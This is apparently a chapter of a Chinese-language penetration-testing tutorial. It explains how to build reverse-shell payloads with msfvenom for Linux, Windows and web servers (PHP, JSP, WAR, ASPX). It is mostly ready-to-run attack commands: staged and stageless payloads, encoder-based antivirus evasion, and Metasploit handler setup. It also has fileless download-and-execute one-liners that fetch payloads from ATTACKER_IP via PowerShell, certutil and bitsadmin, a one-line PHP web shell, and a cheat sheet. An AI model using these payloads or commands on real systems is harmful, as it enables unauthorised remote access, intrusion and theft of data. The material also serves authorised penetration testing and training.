## 理論基礎

```text
Payload 類型：

Stageless（單段，直接嵌入 shellcode）：
  格式：linux/x64/shell_reverse_tcp、windows/x64/shell_reverse_tcp
  優點：一次執行，不需第二次下載
  缺點：體積較大，特徵明顯

Staged（分段，第一段下載第二段）：
  格式：linux/x64/shell/reverse_tcp、windows/x64/meterpreter/reverse_tcp
  第一段（stager）：小型，只建立連線
  第二段（stage）：從 C2 下載 Meterpreter/shellcode
  優點：初始 payload 小、功能強
  缺點：需要後續下載，被防火牆分析的機會更多

格式說明：
  /shell_reverse_tcp → stageless（一個 /）
  /shell/reverse_tcp → staged（兩個 /，中間有分隔）
  meterpreter → Metasploit 的進階 shell（更多功能）

輸出格式（-f）：
  elf → Linux 可執行二進位
  exe → Windows PE
  raw → 原始 shellcode
  py → Python 腳本
  ps1 → PowerShell
  asp / aspx / jsp / war → Web shell
```

## 方法一：msfvenom 基本語法

```bash
# 查看所有可用 payload
msfvenom -l payloads | grep "linux/x64\|windows/x64"
# -l payloads → 列出所有 payload
# 過濾 linux 或 windows x64 架構

# 基本語法
msfvenom -p PAYLOAD LHOST=ATTACKER_IP LPORT=4444 -f FORMAT -o OUTPUT_FILE
# -p → payload 名稱
# LHOST → 攻擊機 IP（reverse shell 的目標）
# LPORT → 攻擊機監聽埠
# -f → 輸出格式
# -o → 輸出檔名

# 查看 payload 所需參數
msfvenom -p linux/x64/shell_reverse_tcp --list-options
# Required → 必填
# Optional → 選填
```

## 方法二：Linux Payload

```bash
# Linux x64 stageless reverse shell（ELF）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
# shell_reverse_tcp → stageless（直接連回、啟動 /bin/sh）
# -f elf → Linux 可執行格式

# Linux x64 staged（需 Metasploit multi/handler 接收）
msfvenom -p linux/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o staged.elf
# shell/reverse_tcp → staged（/ 隔開代表分段）

# Linux x86（32 位元目標）
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell_x86.elf

# Meterpreter（Linux，功能最強）
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o meter.elf

# 傳到目標後執行
chmod +x shell.elf && ./shell.elf
```

## 方法三：Windows Payload

```bash
# Windows x64 stageless reverse shell（EXE）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
# -f exe → Windows PE 格式

# Windows x64 Meterpreter（功能最完整）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o meter.exe

# Windows x86（32 位元）
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell_x86.exe

# DLL 格式（DLL 注入或 rundll32 執行）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o shell.dll
# 觸發：rundll32 shell.dll,EntryPoint

# PowerShell 格式（適合無法傳 EXE 的環境）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f ps1 -o shell.ps1
# 目標執行：powershell -ExecutionPolicy Bypass -File shell.ps1

# 編碼繞過（shikata_ga_nai，x86 only）
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
# -e → 編碼器
# -i 3 → 編碼 3 次（增加混淆）
# 注意：現代 AV 通常能識別，不要依賴此繞過
```

## 方法四：Web Shell Payload

```bash
# PHP reverse shell（Web RCE 環境）
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
# -f raw → 直接輸出 PHP 程式碼

# JSP（Tomcat/Java 環境）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp

# WAR（Tomcat 部署）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
# -f war → WAR 封包（可直接上傳到 Tomcat manager）

# ASPX（Windows IIS .NET）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
```

## 方法五：Metasploit multi/handler（接收 Meterpreter/staged）

```bash
# 啟動 Metasploit
msfconsole

# 設定 handler 接收 staged reverse shell
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
# 或 windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
set ExitOnSession false
# ExitOnSession false → 收到連線後不關閉 handler（等待多個連線）
run -j
# -j → 背景執行（可繼續操作 msfconsole）

# 查看已建立的 session
sessions -l
# 進入指定 session
sessions -i 1

# Meterpreter 常用命令
meterpreter > getuid          # 確認當前身份
meterpreter > sysinfo         # 系統資訊
meterpreter > upload file /tmp/  # 上傳檔案
meterpreter > download /etc/passwd  # 下載檔案
meterpreter > shell           # 進入 shell（可用 exit 回 Meterpreter）
meterpreter > background      # 背景化 session（回 msfconsole）
```

## 方法六：Living-off-the-Land（無需上傳 payload）

```bash
# Linux — 利用現有工具（確認目標環境有什麼）
which python3 python perl nc bash curl wget
# 有什麼就用什麼（見第 55 章 reverse shell one-liners）

# Windows — PowerShell 下載執行（無需落地 EXE）
# 攻擊機先架 HTTP server
python3 -m http.server 8080

# 目標執行（下載並執行 PowerShell 腳本）
powershell -NoP -NonI -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/shell.ps1')"
# IEX → Invoke-Expression（執行字串）
# DownloadString → 下載到記憶體中直接執行（不落地檔案）

# Windows — certutil 下載（常見 LOLBAS）
certutil -urlcache -split -f http://ATTACKER_IP:8080/shell.exe C:\Windows\Temp\shell.exe
# certutil → Windows 憑證工具，可用於下載（繞過某些限制）

# Windows — bitsadmin（老版 Windows）
bitsadmin /transfer job http://ATTACKER_IP:8080/shell.exe C:\Temp\shell.exe
```

## 決策流程

```
目標環境確認
    ↓
Linux？
  x64 → msfvenom -p linux/x64/shell_reverse_tcp -f elf
  x86 → msfvenom -p linux/x86/shell_reverse_tcp -f elf
  無法落地 → python3/bash one-liner（第 55 章）
    ↓
Windows？
  GUI/EXE 可執行 → msfvenom -p windows/x64/shell_reverse_tcp -f exe
  只能 PowerShell → -f ps1 或 IEX DownloadString
  Web 服務（IIS）→ -f aspx
    ↓
Web RCE？
  PHP → -f raw PHP
  Java → -f war（Tomcat）/ -f raw JSP
    ↓
需要 Meterpreter（更多功能）？
  → staged payload + msfconsole multi/handler
```

## 速查表

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# Tomcat WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php

# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o meter.exe

# multi/handler
msfconsole -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; run"
```

## 常見錯誤與排查

- 架構不匹配（x86 payload 在 x64 系統）→ 確認目標架構再選 payload。
- staged payload 但沒開 multi/handler → nc 無法處理 staged；需用 msfconsole。
- stageless 用 nc 接，但 payload 是 meterpreter → nc 只能接 shell，meterpreter 需 multi/handler。
- PHP payload 上傳後執行沒反應 → 確認 `allow_url_fopen` 或用更簡單的 `<?php system($_GET["cmd"]); ?>`。
